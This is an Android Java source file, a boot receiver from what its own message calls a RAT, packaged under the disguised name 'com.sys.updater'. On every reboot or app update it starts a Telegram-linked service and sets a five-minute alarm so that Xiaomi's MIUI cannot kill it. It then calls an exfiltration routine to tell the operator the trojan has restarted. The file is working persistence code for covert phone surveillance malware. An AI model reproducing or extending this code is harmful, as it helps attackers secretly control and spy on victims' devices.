package com.sys.updater;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || 
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction())) {
            
            // 1. Start Service
            Intent serviceIntent = new Intent(context, TelegramService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            // 2. AlarmManager (bach MIUI ma-y9telhach)
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            Intent alarmIntent = new Intent(context, TelegramService.class);
            PendingIntent pendingIntent = PendingIntent.getService(context, 0, alarmIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            
            if (alarmManager != null) {
                // Kay-3awd y-ch3lo kol 5 dqayq
                alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 5 * 60 * 1000, pendingIntent);
            }

            Exfil.send("🔄 Phone Rebooted. RAT Auto-started.");
        }
    }
        }
